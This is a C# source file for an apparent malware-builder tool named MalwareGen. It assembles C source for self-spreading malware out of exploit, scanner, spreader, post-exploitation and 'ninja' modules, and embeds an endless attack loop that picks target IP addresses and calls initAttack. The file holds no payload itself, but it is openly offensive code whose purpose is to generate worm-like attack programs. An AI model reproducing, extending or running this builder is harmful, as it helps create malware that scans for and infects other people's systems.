using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Xml;

namespace MalwareGen
{
    class Controller
    {
        private static String mainExploit =
            "	int  ipAddress[4];\r\n"
            + "[chooseIP](ipAddress);\r\n"
            + "	for (;;){\r\n"
            + "	initAttack(ipAddress);\r\n"
            + "    }\r\n"
            + "    WSACleanup();\r\n";
        private static List<Modules> lsModules = new List<Modules>();
        private static String[] types = { "exploit","control","ninja","postexploit","scanner","spreader"} ;
        public static String moduleDir = @"Modules";
        public static String templateDir = "";
        public static String outputDir = @"Output";
        public static String getAllModuleName()
        {
            String ret ="";
            foreach(Modules test in lsModules)
            {
                ret += test.MName + Environment.NewLine;
            }
            return ret;
        }
        public static void clearAllModules()
        {
            lsModules.Clear();
        }
        private static void removeModulebyName(String MName)
        {
            lsModules.Remove(lsModules.Find(p => p.MName == MName));
        }
        public static void BuildTree(DirectoryInfo directoryInfo, TreeNodeCollection addInMe)
        {
            TreeNode curNode = addInMe.Add(directoryInfo.Name);

            //foreach (FileInfo file in directoryInfo.GetFiles())
            //{
               
            //    curNode.Nodes.Add(file.FullName, file.Name);
            //}
            foreach (DirectoryInfo subdir in directoryInfo.GetDirectories())
            {
                BuildTree(subdir, curNode.Nodes);
            }
        }
        public static bool checkMType(Modules mod)
        {
            if (types.Contains(mod.MType.ToLower()))
                return true;
            return false;
        }
        public static void addModules(Modules mod)
        {
            //validate module
            if(mod.MName == "" && !(checkMType(mod)))
            {
                MessageBox.Show("This module is not valid! Please check again");
                return;
            }
            try
            {
                //Each module just add once
                bool check=true;
                foreach(Modules a in lsModules)
                {
                    if (mod.MName == a.MName)
                        check = false;
                }
                if (check)
                {
                    lsModules.Add(mod);
                }
            }
            catch(Exception e)
            {
                MessageBox.Show(e.ToString());
            }
            
        }
        public static void generate(String malName,String template)
        {
            string threads = "1";
            templateDir = template;
            //copy template file to output folder
            String targetDir = Path.Combine(outputDir, malName);
            if (!Directory.Exists(targetDir))
            {
                Directory.CreateDirectory(targetDir);
            }
            String headerFile = targetDir + "\\" + malName + ".h";
            String sourceFile = targetDir + "\\" + malName + ".c";
            File.Copy(templateDir+"\\template.h",headerFile , true);
            File.Copy(templateDir + "\\template.c", sourceFile, true);
            //Copy Module file to output folder
            foreach(Modules mod in lsModules)
            {
                foreach (String file in Directory.GetFiles(mod.Path))
                {
                    String c = file.Replace(mod.Path, "");
                    if (c != "info.xml")
                        File.Copy(file, targetDir + "\\" + c);
                }
            }
            //Create exploit file
            if (hasExploit())
            {
                //Choose threads (targets/round)
                threads = ChooseThreads();
                //+choose main spreader
                Modules sp = ChooseSpreader();
                addModules(sp);
                //+choose main scanner
                Modules sc = ChooseScanner();
                addModules(sc);
                //+replace main exploit
                String text = mainExploit;
                text = text.Replace("[chooseIP]", sc.MName);
                generateExploit(malName);
                String tmp = File.ReadAllText(sourceFile);
                tmp = tmp.Replace("[mainExploit]", Environment.NewLine + text);
                File.WriteAllText(sourceFile, tmp);
            }
            else { }
            //Create something else in source file
            //include header file
            String a = File.ReadAllText(sourceFile);
            a = a.Replace("[malwareName]", malName);
            File.WriteAllText(sourceFile, a);
            a = "";
            //Create header file
            try
            {
                generateHeader(malName, threads);
                MessageBox.Show("Tạo thành công! Mã nguồn lưu tại: " + outputDir + "\\" + malName + "\\");
            }
            catch(Exception e)
            {
                MessageBox.Show("Có lỗi trong quá trình ghi file!" + Environment.NewLine + e.ToString());
            }
        }
        private static bool hasExploit()
        {
            bool check = false;
            foreach (Modules a in lsModules)
            {
                if (a.MType.ToLower() == "exploit")
                    check = true;
            }
            return check;
        }
        private static void generateHeader(String malName,String threads)
        {
            String headerFile = outputDir + "\\" + malName + "\\" + malName + ".h";
            String text = "";
            try
            {
                text = File.ReadAllText(headerFile);
            }
            catch { }
            
            //include source file
            text = text.Replace("[sourcefile]", Environment.NewLine + "#include \"" + malName + ".c\"");
            //Define Malware name
            text = text.Replace("[malwareName]", Environment.NewLine + "#define MALNAME \"" +malName+"\"");
            String tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                //include header file
                foreach (String a in test.Files)
                    tmp += (a.Substring(a.Length-2,2) == ".h") ? "#include \""+a+"\"" + Environment.NewLine : "";
            }
            text = text.Replace("[headerfile]", Environment.NewLine + tmp);
            tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                if(test.Header!=null)
                    tmp += "//" + test.MName + Environment.NewLine + test.Header.Trim() + Environment.NewLine;
            }
            text = text.Replace("[headerString]", Environment.NewLine + tmp);
            tmp = "";
            text = text.Replace("[threads]", threads);
            try
            {
                File.WriteAllText(headerFile, text);
            }
            catch { }
            
        }
        private static void generateExploit(String malName)
        {
            String mainFile = outputDir + "\\" + malName + "\\" + malName + ".c";
            //exFunc store exploit function for each exploit Module.
            //exThre store the code that run the exploit Module in mutithreads mode.
            String exFunc = "";
            String exThre = "";
            String tmp = "";
            tmp = File.ReadAllText(templateDir + "\\" + "template.c");
            foreach (Modules test in lsModules)
            {
                if(test.MType.ToLower() == "exploit")
                {
                    //generate exploit function
                    exFunc += File.ReadAllText(templateDir + "\\" + "exploitFunction.c");
                    exFunc = exFunc.Replace("[exploitName]", test.MName);
                    exFunc = exFunc.Replace("[isExploit]", "isTarget_"+test.MName);
                    exFunc = exFunc.Replace("[Spreader]", test.Spreader);
                    exFunc += Environment.NewLine;
                    //generate exploit threads
                    exThre += File.ReadAllText(templateDir + "\\" + "exploitThreads.c");
                    exThre = exThre.Replace("[exploitName]", test.MName);
                    exThre = exThre.Replace("[increaseIP]", test.Increaseip);
                    exThre += Environment.NewLine;
                }
            }
            tmp = tmp.Replace("[exploitThreads]", Environment.NewLine + exThre);
            tmp = tmp.Replace("[exploit_function]", Environment.NewLine + exFunc);
            File.WriteAllText(mainFile, tmp);
        }
        private static Modules ChooseSpreader()
        {
            frmChooseSpreader testDialog = new frmChooseSpreader();
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static Modules ChooseScanner()
        {
            frmChooseScanner testDialog = new frmChooseScanner();
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static String ChooseInput(String inputName,String value,String modName)
        {
            frmInput testDialog = new frmInput(inputName, value, modName);
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        public static void addInputValue(ref Modules mod, String key, String value)
        {
            String val = ChooseInput(key, value,mod.MName);
            mod.Inputs[key] = val;
        }
        private static String ChooseThreads()
        {
            frmThreads testDialog = new frmThreads();
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
    }
}
